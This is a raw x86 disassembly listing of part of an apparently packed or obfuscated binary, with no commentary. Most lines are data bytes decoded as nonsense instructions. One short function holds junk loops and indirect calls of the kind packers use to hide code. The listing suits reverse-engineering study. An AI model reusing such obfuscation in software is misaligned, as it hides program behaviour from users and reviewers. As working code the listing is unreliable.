  4068fa:	sbb    DWORD PTR [ebp+0xe],esp
  4068fd:	sub    BYTE PTR [eax],bh
  4068ff:	fadd   st,st(6)
  406901:	sub    al,0x54
  406903:	scas   al,BYTE PTR es:[edi]
  406904:	adc    eax,eax
  406906:	push   edi
  406907:	mov    ecx,0xe33c96ca
  40690c:	add    al,0x92
  40690e:	sub    eax,0xcb2246be
  406913:	jnp    0x4068c1
  406915:	push   ebp
  406916:	sbb    ah,ah
  406918:	cmp    cl,BYTE PTR [eax-0x6b6f0f68]
  40691e:	and    al,0xca
  406920:	ss and al,0x1
  406923:	sub    eax,0xc2798598
  406928:	cli    
  406929:	in     al,dx
  40692a:	push   ds
  40692b:	cmc    
  40692c:	add    eax,DWORD PTR [esi-0x41d6dd7c]
  406932:	xor    BYTE PTR [eax],bl
  406934:	shl    ah,0x2c
  406937:	das    
  406938:	or     DWORD PTR [esi+0x6],ebp
  40693b:	cld    
  40693c:	mov    bl,dl
  40693e:	and    ebp,DWORD PTR cs:[eax+0xd2508ef]
  406945:	call   FWORD PTR [eax+0x7082b1c5]
  40694b:	cmp    eax,0x366eda0b
  406950:	push   ecx
  406951:	jnp    0x4068d5
  406953:	push   0xffffffad
  406955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406956:	ja     0x4068dc
  406958:	ret    
  406959:	stc    
  40695a:	call   0x728c6629
  40695f:	(bad)  
  406960:	adc    BYTE PTR [esi],dh
  406962:	jns    0x4068f7
  406964:	jmp    0xdce39ea2
  406969:	popf   
  40696a:	mov    al,ds:0xbb8c11d0
  40696f:	ret    0x840d
  406972:	test   eax,0xb9bcca93
  406977:	lock outs dx,BYTE PTR ds:[esi]
  406979:	add    ah,BYTE PTR [eax]
  40697b:	mov    bh,0x60
  40697d:	(bad)  es:[esi-0xf8eb8fc]
  406984:	cmp    bh,BYTE PTR [edx]
  406986:	cmp    eax,0xd6714e1b
  40698b:	mov    BYTE PTR ds:0x358e83cf,dl
  406991:	mov    edx,0x786f0d88
  406996:	xchg   esi,eax
  406997:	in     eax,0xe5
  406999:	jmp    0x2171:0x2b555b82
  4069a0:	fsub   DWORD PTR [eax+0x5325fbd0]
  4069a6:	sub    cl,dh
  4069a8:	test   DWORD PTR [ecx-0x5f244eb0],0xd0f72489
  4069b2:	and    eax,eax
  4069b4:	(bad)  
  4069b6:	push   ecx
  4069b7:	scas   ax,WORD PTR es:[edi]
  4069b9:	and    DWORD PTR [ebp+0x548a3816],0xffffffc3
  4069c0:	mov    cl,0x8e
  4069c2:	mov    ds:0x200bed2b,eax
  4069c7:	xor    al,BYTE PTR [edi+edx*8]
  4069ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069cb:	and    DWORD PTR ds:0xe6cef485,edx
  4069d1:	clc    
  4069d2:	and    DWORD PTR [ebx-0x44ca7a6],ebp
  4069d8:	call   0x7118:0xaaecdd54
  4069df:	test   ecx,eax
  4069e1:	inc    eax
  4069e2:	pop    esi
  4069e3:	loopne 0x406a2d
  4069e5:	inc    edi
  4069e6:	push   cs
  4069e7:	cwde   
  4069e8:	fwait
  4069e9:	ins    BYTE PTR es:[edi],dx
  4069ea:	dec    eax
  4069eb:	or     BYTE PTR [ebx+ecx*1+0x42],ch
  4069ef:	dec    ecx
  4069f0:	mov    edx,0x17d4fe78
  4069f5:	inc    edx
  4069f6:	sub    ch,ch
  4069f8:	push   cs
  4069f9:	bound  ebx,QWORD PTR [edi]
  4069fb:	frstor ds:0x453889ec
  406a01:	out    0x4c,eax
  406a03:	aas    
  406a04:	pusha  
  406a05:	and    BYTE PTR [eax+ebx*2-0x5dd0684c],bh
  406a0c:	sub    al,0xf8
  406a0e:	jmp    0xa6c4:0x7e55e7c1
  406a15:	mov    ebx,0x12aa7df4
  406a1a:	jns    0x406a1a
  406a1c:	in     eax,0x2d
  406a1e:	popf   
  406a1f:	pushf  
  406a20:	dec    edx
  406a21:	or     dl,cl
  406a23:	out    dx,al
  406a24:	icebp  
  406a25:	pop    esp
  406a26:	(bad)  
  406a27:	imul   esp,DWORD PTR fs:[edx+0x65328ee8],0xfa849383
  406a32:	or     al,bh
  406a34:	and    bl,bl
  406a36:	mov    ecx,0x96bea946
  406a3b:	std    
  406a3c:	mov    dl,0x8d
  406a3e:	jo     0x406a68
  406a40:	scas   eax,DWORD PTR es:[edi]
  406a41:	inc    edx
  406a42:	jmp    0xa17d98a0
  406a47:	(bad)  
  406a48:	lea    ebp,[eax+ebp*1-0x686a0b38]
  406a4f:	js     0x406a94
  406a51:	xchg   BYTE PTR [ebx+edx*8],dh
  406a54:	inc    esi
  406a55:	pop    ebp
  406a56:	sbb    bl,BYTE PTR [edx]
  406a58:	xor    al,0x8a
  406a5a:	nop
  406a5b:	js     0x406a46
  406a5d:	hlt    
  406a5e:	adc    al,0x36
  406a60:	enter  0x1ea1,0xe8
  406a64:	mov    esi,0xbddc38e8
  406a69:	adc    eax,0x3c7abe7c
  406a6e:	sub    eax,0xe3ae2831
  406a73:	(bad)  
  406a74:	fstp   QWORD PTR [ecx-0x77a2d00]
  406a7a:	jbe    0x406ae0
  406a7c:	or     edi,edx
  406a7e:	adc    bh,ah
  406a80:	lahf   
  406a81:	jge    0x406aee
  406a83:	push   esp
  406a84:	sbb    dh,BYTE PTR [ebx]
  406a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a87:	inc    esi
  406a88:	xchg   edx,eax
  406a89:	pop    ss
  406a8a:	popa   
  406a8b:	scas   eax,DWORD PTR es:[edi]
  406a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a8d:	inc    ebp
  406a8e:	jae    0x406acc
  406a90:	xchg   ecx,eax
  406a91:	xor    DWORD PTR [eax-0x41],ebx
  406a94:	rcr    BYTE PTR [ebp-0x301e97a1],cl
  406a9a:	mov    dh,0xa2
  406a9c:	adc    BYTE PTR [esi-0x2b8ea481],cl
  406aa2:	sbb    eax,0xde4962cf
  406aa7:	pushf  
  406aa8:	sbb    al,BYTE PTR [ebp+eiz*4+0x45]
  406aac:	mul    BYTE PTR [ecx-0x2c]
  406aaf:	stc    
  406ab0:	inc    eax
  406ab1:	scas   al,BYTE PTR es:[edi]
  406ab2:	(bad)  
  406ab3:	xchg   edx,eax
  406ab4:	mov    ebp,0x1718e260
  406ab9:	test   DWORD PTR [ecx],ecx
  406abb:	ffree  st(6)
  406abd:	sahf   
  406abe:	call   0x6019e8e
  406ac3:	pushf  
  406ac4:	jb     0x406af8
  406ac6:	add    cl,cl
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e67b,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fc81,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fc59
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e66f,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fc59
  406b20:	and    esi,DWORD PTR ds:0x42e0a8
  406b26:	mov    DWORD PTR ds:0x42fc59,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e673,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e673,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e673,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e25f
  406b61:	mov    edi,DWORD PTR ds:0x42e673
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e673,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fc71,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fc71,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fc71,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fc7d
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e4bf
  406bad:	mov    edi,DWORD PTR ds:0x42fc71
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fc71,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fc65,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fc65
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fc65,edi
  406bdb:	cmp    DWORD PTR ds:0x42fc65,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fc65,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fc6d
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e3db
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fcf6,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fcf6
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fcf6,edi
  406c22:	cmp    DWORD PTR ds:0x42fcf6,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e687
  406c34:	push   0x42e124
  406c39:	call   DWORD PTR ds:0x42e4c3
  406c3f:	cmp    DWORD PTR ds:0x42fcf6,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fcf6
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fcf6,edi
  406c59:	cmp    DWORD PTR ds:0x42fcf6,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e693,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e68b,0x42fcf6
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0xea
  406c9b:	sbb    edx,ebx
  406c9d:	icebp  
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406cc4
  406ca7:	cld    
  406ca8:	fnclex 
  406caa:	xchg   ebp,eax
  406cab:	cs xchg ebx,eax
  406cad:	jecxz  0x406c3e
  406caf:	retf   0x5a85
  406cb2:	test   eax,0x4e0f86e0
  406cb7:	test   DWORD PTR [edi-0x7b],ecx
  406cba:	in     eax,dx
  406cbb:	inc    ebp
  406cbc:	daa    
  406cbd:	icebp  
  406cbe:	mov    bh,dh
  406cc0:	popa   
  406cc1:	or     ebx,DWORD PTR [eax+0x20]
  406cc4:	arpl   WORD PTR [edx+0x3598f3f5],bx
  406cca:	jmp    FWORD PTR [edi+ebx*2]
  406ccd:	js     0x406c81
  406ccf:	dec    ecx
  406cd0:	xor    esp,ebp
  406cd2:	dec    edi
  406cd3:	neg    DWORD PTR [eax]
  406cd5:	lock leave 
  406cd7:	ins    DWORD PTR es:[edi],dx
  406cd8:	mov    BYTE PTR [ecx+0x71121ab9],bl
  406cde:	dec    esp
  406cdf:	mov    dh,0x0
  406ce1:	inc    edi
  406ce2:	xchg   edx,eax
  406ce3:	shl    BYTE PTR [edi-0x64007ae2],cl
  406ce9:	xchg   ebp,eax
  406cea:	push   ss
  406ceb:	inc    esi
  406cec:	dec    edi
  406ced:	and    bl,BYTE PTR [ebx+eiz*1+0x8]
  406cf1:	fcmovbe st,st(6)
  406cf3:	push   esp
  406cf4:	in     eax,dx
  406cf5:	mov    bh,0x26
  406cf7:	jg     0x406d1c
  406cf9:	out    dx,al
  406cfa:	fdiv   st,st(0)
  406cfc:	dec    edx
  406cfd:	jnp    0x406cd2
  406cff:	sub    ebp,0x6f
  406d02:	sub    eax,0x196dce50
  406d07:	cmp    al,0xe7
  406d09:	mov    edi,DWORD PTR [eax+0x3]
  406d0c:	in     al,0x5d
  406d0e:	jmp    0xe72:0xc9c8a3d5
  406d15:	(bad)  
  406d16:	rcr    ch,cl
  406d18:	xor    eax,0x78f72769
  406d1d:	outs   dx,DWORD PTR ds:[esi]
  406d1e:	fisub  WORD PTR [eax]
  406d20:	(bad)  
  406d21:	je     0x406d10
  406d23:	push   0x2ea0870a
  406d28:	ficom  WORD PTR [ebp+0x71b96f92]
  406d2e:	push   ds
  406d2f:	test   BYTE PTR [ebx+0x2d],bh
  406d32:	retf   
  406d33:	dec    ebp
  406d34:	or     DWORD PTR [edi],esi
  406d36:	or     DWORD PTR [edi+0x21],0x97da3018
  406d3d:	adc    ah,bl
  406d3f:	mov    esp,0x4a27e2f4
  406d44:	add    BYTE PTR [edx-0x7c],al
  406d47:	add    bh,ah
  406d49:	test   BYTE PTR ds:0x764be6c0,ah
  406d4f:	mov    es,edx
  406d51:	loop   0x406d48
  406d53:	inc    eax
  406d54:	ins    BYTE PTR es:[edi],dx
  406d55:	pop    ds
  406d56:	and    al,0x16
  406d58:	enter  0x7505,0xf3
  406d5c:	mov    bl,0x60
  406d5e:	data16 test BYTE PTR [ebp-0x39],dh
  406d62:	ficomp WORD PTR fs:[ecx]
  406d65:	addr16 jmp 0x74f6c90f
  406d6b:	fldcw  WORD PTR es:[esi+0x7]
  406d6f:	push   es
  406d70:	jecxz  0x406dd0
  406d72:	add    BYTE PTR [ecx],bh
  406d74:	test   al,0xce
  406d76:	lds    ebx,FWORD PTR ds:0x9a6be21b
  406d7c:	push   ecx
  406d7d:	or     al,0xb6
  406d7f:	cld    
  406d80:	dec    ebp
  406d81:	mov    DWORD PTR [eax-0x341efb82],0xc04773d8
  406d8b:	fidiv  WORD PTR [ebp+0x49a2e521]
  406d91:	cmc    
  406d92:	shl    al,1
  406d94:	pushw  0xffef
  406d97:	fcmove st,st(5)
  406d99:	sub    al,0x6f
  406d9b:	(bad)  
  406d9c:	xchg   edx,eax
  406d9d:	cld    
  406d9e:	aad    0x56
  406da0:	jg     0x406d96
  406da2:	jmp    0x1b51:0x6ba10815
  406da9:	dec    ebx
  406daa:	aam    0x52
  406dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dad:	fidivr DWORD PTR [edi+edi*2-0xe161f4f]
  406db4:	sbb    al,BYTE PTR [edx-0x4c]
  406db7:	test   BYTE PTR [ebp+0x705e5773],dl
  406dbd:	push   ds
  406dbe:	mov    bl,bh
  406dc0:	cld    
  406dc1:	imul   edi,DWORD PTR [ecx],0xcd2e6634
  406dc7:	ss or  al,0x2d
  406dca:	pop    eax
  406dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dcc:	in     eax,0x5e
  406dce:	iret   
  406dcf:	mov    ecx,0x603c1aac
  406dd4:	xchg   edi,eax
  406dd5:	es clc 
  406dd7:	mov    ds:0xc8b2ca25,al
  406ddc:	loop   0x406dfe
  406dde:	xor    BYTE PTR [eax+0xad03286],0xb6
  406de5:	or     BYTE PTR [ecx+0x32bf692b],0x64
  406dec:	call   0xb052:0x759e943a
  406df3:	scas   eax,DWORD PTR es:[edi]
  406df4:	es int3 
  406df6:	dec    edi
  406df7:	daa    
  406df8:	ss das 
  406dfa:	into   
  406dfb:	loop   0x406e2d
  406dfd:	xor    cl,BYTE PTR [eax]
  406dff:	add    BYTE PTR ds:0xec2ea366,cl
  406e05:	pushf  
  406e06:	mov    DWORD PTR ds:0x6688b564,ecx
  406e0c:	xchg   esp,eax
  406e0d:	adc    eax,0xb74d5520
  406e12:	int3   
  406e13:	pusha  
  406e14:	out    dx,eax
  406e15:	xchg   BYTE PTR [ebx-0x6ab0e188],dl
  406e1b:	xor    DWORD PTR es:[edx+0x55],ebp
  406e1f:	pop    ecx
  406e20:	xor    ebp,DWORD PTR [ecx]
  406e22:	and    al,0x14
  406e24:	mov    dh,0xb4
  406e26:	jnp    0x406db2
  406e28:	dec    ebp
  406e29:	(bad)  
  406e2c:	popa   
  406e2d:	adc    BYTE PTR [esi+0x40],bh
  406e30:	mov    esi,0x78e83f06
  406e35:	ret    
  406e36:	in     al,dx
  406e37:	call   0x7458:0x6f859d86
  406e3e:	inc    ebx
  406e3f:	jns    0x406ea2
  406e41:	popa   
  406e42:	and    BYTE PTR [eax+0x6904aa87],0x9a
  406e49:	test   BYTE PTR [eiz*4+0x4f6d8818],al
  406e50:	stos   BYTE PTR es:[edi],al
  406e51:	popf   
  406e52:	cmp    edi,ebx
  406e54:	(bad)  
  406e55:	pop    esp
  406e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e57:	cmp    DWORD PTR ds:0xe5461329,ecx
  406e5d:	popa   
  406e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e5f:	fdiv   DWORD PTR [edi+0x37]
  406e62:	sbb    esp,DWORD PTR ds:[ecx-0x7d4eb231]
  406e69:	inc    esi
  406e6a:	hlt    
  406e6b:	xchg   esp,eax
  406e6c:	pop    edx
  406e6d:	push   edi
  406e6e:	jmp    0xfefb9867
  406e73:	fistp  QWORD PTR [esi-0x2ed8c01]
  406e79:	fwait
  406e7a:	arpl   WORD PTR [esi],cx
  406e7c:	adc    ecx,DWORD PTR [ebp+0x6f]
  406e7f:	fdiv   st,st(4)
  406e81:	retf   
  406e82:	fimul  WORD PTR [ecx+0x6a]
  406e85:	in     al,0xb2
  406e87:	or     eax,ebx
  406e89:	in     eax,0xb0
  406e8b:	sub    eax,0xa665c4bb
  406e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e91:	inc    ebx
  406e92:	pushf  
  406e93:	shl    bh,1
  406e95:	dec    esi
  406e96:	sbb    eax,DWORD PTR fs:[eax+edi*8]
  406e9a:	repnz adc al,BYTE PTR [edx-0x1e]
  406e9e:	jb     0x406e29
  406ea0:	idiv   BYTE PTR [esi-0x53]
  406ea3:	pop    edx
  406ea4:	in     eax,0xe3
  406ea6:	outs   dx,BYTE PTR ds:[esi]
  406ea7:	xor    al,0x6c
  406ea9:	sar    DWORD PTR [ebp-0x2dba0dbe],1
  406eaf:	adc    eax,0x4c10fcd4
  406eb4:	pop    edx
  406eb5:	pop    edx
  406eb6:	pop    es
  406eb7:	jp     0x406e9f
  406eb9:	xor    eax,0xc866df9e
  406ebe:	js     0x406ee2
  406ec0:	dec    eax
  406ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ec2:	sbb    edi,DWORD PTR ds:0xca3ea409
  406ec8:	cmp    ebp,DWORD PTR ds:0xa2ea88f2
  406ece:	mov    ds:0x20c072e4,eax
  406ed3:	dec    esp
  406ed4:	pop    ebx
  406ed5:	rcr    BYTE PTR [edi],1
  406ed7:	rcr    DWORD PTR [ecx+0x48],0xc8
  406edb:	dec    eax
  406edc:	ds jno 0x406eb4
  406edf:	dec    ebp
  406ee0:	retf   
  406ee1:	cld    
  406ee2:	sub    DWORD PTR [edx],esi
  406ee4:	jg     0x406f42
  406ee6:	mov    BYTE PTR [ebx+0x2b38d70e],ah
  406eec:	pop    esi
  406eed:	pop    ss
  406eee:	leave  
  406eef:	pop    eax
  406ef0:	push   edi
  406ef1:	push   ebx
  406ef2:	(bad)  
  406ef4:	cmp    eax,0xb475c252
  406ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406efa:	cli    
  406efb:	aaa    
  406efc:	nop
  406efd:	add    BYTE PTR [ecx-0x120918a3],al
  406f03:	(bad)  
  406f04:	cmp    eax,0xf62ec886
  406f09:	adc    edx,DWORD PTR [ebp+0x40e3b87a]
  406f0f:	jo     0x406ef9
  406f11:	mov    edi,0xefdf7754
  406f16:	in     al,dx
  406f17:	jecxz  0x406f51
  406f19:	lea    edi,[esi]
  406f1b:	out    0x2d,eax
  406f1d:	cmp    ebx,DWORD PTR [ebx+eiz*2-0x5df75a62]
  406f24:	sub    al,0x40
  406f26:	jmp    0x137a:0xf8c516f8
  406f2d:	xchg   edi,eax
  406f2e:	ins    DWORD PTR es:[edi],dx
  406f2f:	mov    cl,0x3a
  406f31:	mov    ?,WORD PTR [edx]
  406f33:	rcl    ah,cl
  406f35:	or     al,0x84
  406f37:	inc    edi
  406f38:	xchg   ebx,eax
  406f39:	push   cs
  406f3a:	mov    edx,ebp
  406f3c:	in     eax,0x28
  406f3e:	fild   QWORD PTR [edx]
  406f40:	(bad)  
  406f41:	std    
  406f42:	es and ecx,edi
  406f45:	and    eax,0x5227f032
  406f4a:	rcl    BYTE PTR [ebp+0x1ba91c48],0xa8
  406f51:	(bad)  [esi+0x5864789b]
  406f57:	mov    WORD PTR [ebx-0x69],gs
  406f5a:	sbb    ebp,esp
  406f5c:	in     al,dx
  406f5d:	leave  
  406f5e:	fdivp  st(6),st
  406f60:	fdiv   DWORD PTR [ebx]
  406f62:	popf   
  406f63:	mov    al,ds:0xff4050fc
  406f68:	ins    DWORD PTR es:[edi],dx
  406f69:	xchg   DWORD PTR [edi+0x7d],edi
  406f6c:	xchg   DWORD PTR [eax+0x34],eax
  406f6f:	mov    ah,0xf1
  406f71:	mov    eax,ds:0xdc31d2f6
  406f76:	loop   0x406fb5
  406f78:	push   esp
  406f79:	inc    ecx
  406f7a:	imul   edx,DWORD PTR [edx],0xffffffd7
  406f7d:	adc    bh,0xe4
  406f80:	adc    DWORD PTR [edx],ebx
  406f82:	ss es jmp 0xea43ee41
  406f89:	loop   0x406f20
  406f8b:	in     eax,0x3
  406f8d:	popa   
  406f8e:	xor    DWORD PTR [edx+0x4476dc6b],esp
  406f94:	and    BYTE PTR [esi+0x3],ah
  406f97:	(bad)  
  406f98:	test   BYTE PTR [ecx],0x8e
  406f9b:	mov    al,0x32
  406f9d:	sbb    dl,0x3a
  406fa0:	push   ebp
  406fa1:	inc    edx
  406fa2:	push   ss
  406fa3:	aaa    
  406fa4:	data16 cmp al,0xa
  406fa7:	sbb    edx,edi
  406fa9:	xchg   edi,eax
  406faa:	xor    BYTE PTR [ebp+0x2ca77ca7],ch
  406fb0:	xchg   esp,eax
  406fb1:	add    bl,BYTE PTR ds:0xcfe565df
  406fb7:	call   0xf6805b0e
  406fbc:	or     DWORD PTR [ecx-0x3b],esp
  406fbf:	ror    ah,0xd8
  406fc2:	arpl   WORD PTR [ebx],cx
  406fc4:	and    al,0xb6
  406fc6:	lock shl DWORD PTR ds:0xd0545fcc,0x92
  406fce:	xchg   ebx,eax
  406fcf:	xchg   BYTE PTR [edx],bl
  406fd1:	fwait
  406fd2:	mov    cl,0x3a
  406fd4:	pop    ss
  406fd5:	push   ebp
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fcf2,0x42e68b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edx-0x38913791],cx
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x407032
  407018:	add    eax,0x5a6550e6
  40701d:	sti    
  40701e:	mov    ds:0xa0fbc529,eax
  407023:	imul   esp,DWORD PTR [ecx],0xfffffffb
  407026:	push   es
  407027:	test   al,0x8e
  407029:	mov    esi,DWORD PTR [ecx-0x46]
  40702c:	scas   al,BYTE PTR es:[edi]
  40702d:	push   eax
  40702f:	cmc    
  407030:	dec    ebp
  407031:	and    DWORD PTR [edx+0x30],edi
  407034:	ret    
  407035:	dec    ecx
  407036:	jmp    0xe041:0x66838c4e
  40703d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40703e:	fisubr DWORD PTR [ebx+0x16]
  407041:	jmp    DWORD PTR [edi]
  407043:	pop    edx
  407044:	out    0x32,al
  407046:	xchg   BYTE PTR [ecx],bl
  407048:	sub    BYTE PTR [eax-0x548dcea8],0x14
  40704f:	out    dx,al
  407050:	pop    esp
  407051:	and    eax,0xc180d4
  407056:	mul    DWORD PTR [eax+0x7d99a909]
  40705c:	retf   0xd729
  40705f:	enter  0x7b1b,0xfb
  407063:	or     al,0x20
  407065:	cmc    
  407066:	fwait
  407067:	jb     0x40701d
  407069:	add    DWORD PTR [edi+edi*4-0x6b326aa5],0xffffffd0
  407071:	mov    BYTE PTR [ecx-0x593a3106],bl
  407077:	fidivr DWORD PTR [esi]
  407079:	adc    al,0x21
  40707b:	adc    eax,0x92826a0e
  407080:	cld    
  407081:	jecxz  0x4070ef
  407083:	cmp    BYTE PTR [edx-0x6b2b10fc],0xa2
  40708a:	mov    edi,esp
  40708c:	mov    esp,0x8eccb178
  407091:	mov    al,0xda
  407093:	aaa    
  407094:	dec    ebp
  407095:	mov    ds:0x153d83cf,eax
  40709a:	(bad)  
  40709b:	imul   ebp,DWORD PTR [edx-0x45],0xa13bfe20
  4070a2:	sub    al,0x7f
  4070a4:	in     al,dx
  4070a5:	sub    edx,DWORD PTR [ecx+0x59]
  4070a8:	outs   dx,BYTE PTR ds:[esi]
  4070a9:	aaa    
  4070aa:	ret    
  4070ab:	ja     0x4070c8
  4070ad:	into   
  4070ae:	mov    WORD PTR [edx],es
  4070b0:	push   0x13
  4070b2:	adc    BYTE PTR ss:[edi-0x30],ah
  4070b6:	push   0xc7931892
  4070bb:	adc    dh,BYTE PTR [esi+edx*4+0x30]
  4070bf:	mov    dl,0x83
  4070c1:	xchg   edi,eax
  4070c2:	xchg   DWORD PTR fs:[eax-0x70988c88],esp
  4070c9:	loope  0x4070e3
  4070cb:	sub    bh,cl
  4070cd:	cli    
  4070ce:	lea    ecx,[ecx+0x3e]
  4070d1:	in     eax,0x4
  4070d3:	mov    edx,0x26f644ea
  4070d8:	add    DWORD PTR [eax],0xb410f3e0
  4070de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070df:	sbb    bl,ch
  4070e1:	sbb    BYTE PTR [edx],al
  4070e3:	dec    eax
  4070e4:	jns    0x40712d
  4070e6:	mov    ebp,0xb50dba65
  4070eb:	dec    esi
  4070ec:	test   bl,ah
  4070ee:	push   eax
  4070ef:	les    edi,FWORD PTR [ecx-0x431aa831]
  4070f5:	adc    eax,0x5b208783
  4070fa:	es mov ebp,0xe5c60277
  407100:	and    BYTE PTR [edi],cl
  407102:	and    ebx,edx
  407104:	push   ss
  407105:	xchg   ebp,eax
  407106:	jmp    0x7e18ee9
  40710b:	repz jo 0x407136
  40710e:	data16 jnp 0x407153
  407111:	cmp    cl,bh
  407113:	xor    DWORD PTR [ecx+0x308d46e],0xb7cfcf78
  40711d:	jns    0x4070e4
  40711f:	jmp    0x96b8:0xb9927660
  407126:	xor    cl,BYTE PTR [eax]
  407128:	fmulp  st(7),st
  40712a:	call   0x135e:0xf095b747
  407131:	cmp    DWORD PTR [ebx-0x5e],ebx
  407134:	jno    0x4070c5
  407136:	xor    DWORD PTR [ebx+edi*4],esi
  407139:	or     eax,0x851d0efb
  40713e:	popf   
  40713f:	cmp    ah,al
  407141:	sub    al,0xeb
  407143:	outs   dx,BYTE PTR ds:[esi]
  407144:	jae    0x4070fb
  407146:	adc    ebx,0x935f3a2a
  40714c:	push   ss
  40714d:	addr16 retf 
  40714f:	ret    0xae6f
  407152:	mov    al,0x7d
  407154:	adc    eax,DWORD PTR [edi+0x151f8726]
  40715a:	sub    ah,BYTE PTR [edi]
  40715c:	and    DWORD PTR [esi-0x3255e361],edi
  407162:	sar    DWORD PTR [edx+0xc],0x95
  407166:	not    BYTE PTR [ebp+eax*8-0x77]
  40716a:	xor    eax,0x2c2fe1e5
  40716f:	fbstp  TBYTE PTR [eax+0x39]
  407172:	in     eax,0x67
  407174:	inc    esp
  407175:	clc    
  407176:	and    ebp,DWORD PTR [esi+0x5585a198]
  40717c:	ret    0x138
  40717f:	mov    ah,0xe2
  407181:	pop    ebp
  407182:	data16 cld 
  407184:	push   0xdaa683d3
  407189:	xor    bh,BYTE PTR [esi-0x61]
  40718c:	and    esp,eax
  40718e:	push   esp
  407190:	test   ebx,eax
  407192:	mov    ah,BYTE PTR [edx]
  407194:	repz mov ah,0xc4
  407197:	imul   eax,DWORD PTR [ebx+ecx*4-0x610c728a],0x2e28dca4
  4071a2:	dec    edi
  4071a4:	mov    bh,0xb6
  4071a6:	mov    bh,0x88
  4071a8:	call   0xc886c479
  4071ad:	ins    DWORD PTR es:[edi],dx
  4071ae:	mov    bh,0xc0
  4071b0:	cwde   
  4071b1:	shr    dl,0xa2
  4071b4:	add    ah,BYTE PTR [edx+0x7a]
  4071b7:	popa   
  4071b8:	cdq    
  4071b9:	jl     0x407171
  4071bb:	xor    al,0xe1
  4071bd:	adc    eax,0xcedecd26
  4071c2:	sbb    al,0x30
  4071c4:	cmp    al,BYTE PTR [edx-0x53]
  4071c7:	lock xor al,0x8f
